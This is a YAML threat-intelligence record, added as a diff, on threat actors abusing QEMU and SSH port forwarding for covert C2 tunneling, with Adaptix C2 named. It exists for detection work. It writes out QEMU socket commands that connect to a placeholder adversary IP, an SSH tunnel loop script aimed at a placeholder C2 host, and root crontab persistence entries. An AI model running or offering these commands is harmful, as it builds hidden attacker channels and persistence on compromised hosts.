@@ -1,0 +1,81 @@
+title: QEMU Abused for Covert C2 Tunneling and VM-Based Payload Execution
+description: Threat actors abuse QEMU virtualization software to establish covert
+  network tunnels to C2 infrastructure, using SSH port forwarding and socket networking
+  to pivot through compromised hosts. The technique leverages QEMU's networking features
+  (hostfwd, socket connect/listen) to relay traffic without traditional malware.
+attribution: ''
+malware_families:
+- Adaptix
+- Adaptix C2
+cves: []
+ttps:
+  processes:
+  - qemu-system-x86_64.exe
+  - qemu-system-x86_64
+  - ssh
+  - qemu-system-i386.exe
+  command_lines:
+  - qemu-system-x86_64.exe -m 1G -smp 1 -hda vault.db -device e1000,netdev=net0 -netdev
+    user,id=net0,hostfwd=tcp::22022-:22
+  - qemu-system-x86_64 -m 2G -smp 1 -hda kali-linux-2026.1 -qemu-amd64.qcow2-device
+    e1000,netdev=net1 -netdev socket,id=net1,listen=:80
+  - qemu-system-x86_64.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<adversary_ip>:80
+    -netdev hubport,id=hp1,hubid=0,netdev=lan -netdev hubport,id=hp2,hubid=0,netdev=sock
+    -netdev hubport,id=vm,hubid=0 -device e1000,netdev=vm
+  - ssh -o "StrictHostKeyChecking=no" -o "ServerAliveInterval=5" -o "ExitOnForwardFailure=yes"
+    -o "ConnectTimeout=10" <user>@<c2_ip> -p 443 -L 127.0.0.1:33443:127.0.0.1:33443
+    -N
+  - qemu-system-x86_64 -m 2G -smp 1 -hda kali-linux-2026.1-qemu-amd64.qcow2 -device
+    e1000,netdev=net1 -netdev socket,id=net1,listen=:80
+  - qemu-system-i386.exe -m 1M -netdev user,id=lan,restrict=off -netdev socket,id=sock,connect=<adversary_ip>:80
+    -netdev hubport,id=hp1,hubid=0,netdev=lan -netdev hubport,id=hp2,hubid=0,netdev=sock
+    -netdev hubport,id=vm,hubid=0 -device e1000,netdev=vm
+  powershell: []
+  scripts:
+  - '#!/bin/sh
+
+    while true;
+
+    do ssh -o "StrictHostKeyChecking=no" -o "ServerAliveInterval=5" -o "ExitOnForwardFailure=yes"
+    -o "ConnectTimeout=10" <user>@<c2_ip> -p 443 -L 127.0.0.1:33443:127.0.0.1:33443
+    -N;
+
+    sleep 15;
+
+    done'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - ssh -> <c2_ip>:443
+  - qemu-system-x86_64.exe -> <adversary_ip>:80
+  - qemu-system-i386.exe -> <adversary_ip>:80
+  - qemu-system-x86_64 -> listen:80
+  file_activity:
+  - vault.db
+  - /etc/crontabs/root
+  - /sbin/syslogda.sh
+  - /sbin/syslogdb.sh
+  - /sbin/discover
+  - kali-linux-2026.1-qemu-amd64.qcow2
+  persistence:
+  - Root crontab @reboot entry launching /bin/sh /sbin/syslogda.sh>/dev/null 2>&1
+  - Root crontab @reboot entry launching /bin/sh /sbin/syslogdb.sh>/dev/null 2>&1
+  - Shell script loop executing /sbin/discover every 15 seconds via while true; do
+    /sbin/discover; sleep 15; done
+  - SSH reverse tunnel with ExitOnForwardFailure and reconnect loop maintaining persistent
+    port forward to C2 on port 443
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls:
+  - hxxps://github[.]com/Adaptix-Framework/AdaptixC2
+  - hxxps://securelist[.]com/network-tunneling-with-qemu/111803/
+  - hxxps://trustedsec[.]com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization
+  - hxxps://www[.]securonix[.]com/blog/crontrap-emulated-linux-environments-as-the-latest-tactic-in-malware-staging/
+authors:
+- NVISO
+reference: https://blog.nviso.eu/2026/06/04/the-detection-response-chronicles-covert-operations-through-qemu
+date_of_publication: June 04, 2026
+file_creation_date: June 04, 2026
